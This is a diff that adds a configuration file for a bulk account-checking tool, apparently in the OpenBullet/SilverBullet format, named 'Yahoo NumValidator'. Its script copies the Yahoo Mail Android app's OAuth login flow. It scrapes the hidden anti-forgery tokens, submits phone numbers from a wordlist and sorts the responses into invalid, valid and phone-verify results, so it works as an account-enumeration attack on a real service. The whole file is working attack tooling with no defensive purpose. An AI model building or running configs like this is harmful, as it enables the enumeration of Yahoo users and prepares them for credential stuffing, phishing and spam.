@@ -1,0 +1,135 @@
+[SETTINGS]
+{
+  "Name": "Yahoo NumValidator",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2022-02-23T21:08:01.0092296+03:30",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "DrConfiger",
+  "Version": "1.1.2 [SB]",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "AcceptInsecureCertificates": true,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": "",
+  "Title": "Yahoo NumValidator",
+  "IconPath": "Icon\\svbfile.ico",
+  "LicenseSource": null,
+  "Message": null,
+  "MessageColor": "#FFFFFFFF",
+  "HitInfoFormat": "[{hit.Type}][{hit.Proxy}] {hit.Data} - [{hit.CapturedString}]",
+  "AuthorColor": "#FFFFB266",
+  "WordlistColor": "#FFB5C2E1",
+  "BotsColor": "#FFA8FFFF",
+  "CustomInputColor": "#FFD6C7C7",
+  "CPMColor": "#FFFFFFFF",
+  "ProgressColor": "#FFAD93E3",
+  "HitsColor": "#FF66FF66",
+  "CustomColor": "#FFFFB266",
+  "ToCheckColor": "#FF7FFFD4",
+  "FailsColor": "#FFFF3333",
+  "RetriesColor": "#FFFFFF99",
+  "OcrRateColor": "#FF4698FD",
+  "ProxiesColor": "#FFFFFFFF"
+}
+
+[SCRIPT]
+#Hash FUNCTION RandomString "OD?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i" -> VAR "ID" 
+
+#USER FUNCTION URLEncode "+<USER>" -> VAR "US" 
+
+#Pass FUNCTION URLEncode "<PASS>" -> VAR "PS" 
+
+#Req REQUEST GET "https://api.login.yahoo.com/oauth2/request_auth?appid=com.yahoo.mobile.client.android.mail&appsrcv=6.35.3&src=androidphnx&srcv=8.15.0&intl=xa&language=en-EG&sdk-device-id=<ID>&push=1&.asdk_embedded=1&theme=light&redirect_uri=https%3A%2F%2Fapi.login.yahoo.com%2FILokwdqHQAZzHkFZ%2Fcallback%2Fauth&client_id=ILokwdqHQAZzHkFZ&response_type=code&prompt=login&state=SMuezkJyqFS7mCpRCYnZ5A&scope=sdct-w%20mail-w%20sdpp-w%20yfin-w%20sports%20fspt-w%20openid%20device_sso&code_challenge=rUUljxEq9lVsPIi1QAOaj3nH1xHXids56UsKQOjKOCE&code_challenge_method=S256&nonce=aJV7YnyffaA5lToOmU3I0EXCLTIfnQ3X&webview=1" AutoRedirect=FALSE 
+  
+  HEADER "Host: api.login.yahoo.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Linux; Android 10; vivo 1938 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.159 Mobile Safari/537.36" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "X-Requested-With: com.yahoo.mobile.client.android.mail" 
+  HEADER "Sec-Fetch-Site: none" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Accept-Language: en-EG,en;q=0.9,en-US;q=0.8,en;q=0.7" 
+
+#LC PARSE "<HEADERS(Location)>" LR "" "" -> VAR "LC" 
+
+#Req2 REQUEST GET "<LC>" 
+  
+  HEADER "Host: login.yahoo.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Linux; Android 10; vivo 1938 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.159 Mobile Safari/537.36" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "X-Requested-With: com.yahoo.mobile.client.android.mail" 
+  HEADER "Sec-Fetch-Site: none" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Accept-Language: en-EG,en;q=0.9,en-US;q=0.8,en;q=0.7" 
+
+#crumb PARSE "<SOURCE>" LR "<input type=\"hidden\" name=\"crumb\" value=\"" "\" />" -> VAR "CR" 
+
+#CB FUNCTION URLEncode "<CR>" -> VAR "CB" 
+
+#acrumb PARSE "<SOURCE>" LR "<input type=\"hidden\" name=\"acrumb\" value=\"" "\" />" -> VAR "AC" 
+
+#sessionIndex PARSE "<SOURCE>" LR "<input type=\"hidden\" name=\"sessionIndex\" value=\"" "\" />" -> VAR "SD" 
+
+#POST REQUEST POST "<LC>" 
+  CONTENT "crumb=<CB>&acrumb=<AC>&sessionIndex=<SD>&displayName=&deviceCapability=%7B%22pa%22%3A%7B%22status%22%3Atrue%7D%7D&username=<US>&passwd=&signin=Next" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: login.yahoo.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "User-Agent: Mozilla/5.0 (Linux; Android 10; vivo 1938 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.159 Mobile Safari/537.36" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "Accept: */*" 
+  HEADER "Origin: https://login.yahoo.com" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Referer: <LC>" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Accept-Language: en-EG,en;q=0.9,en-US;q=0.8,en;q=0.7" 
+
+#Key KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "INVALID_PHONE_NUMBER" 
+  KEYCHAIN Success AND 
+    KEY "{\"location\":\"/account/challenge/recaptcha?" 
+    KEY "authMechanism=primary\"}" 
+  KEYCHAIN Custom "Verify" OR 
+    KEY "{\"location\":\"/account/challenge/phone-verify" 
+
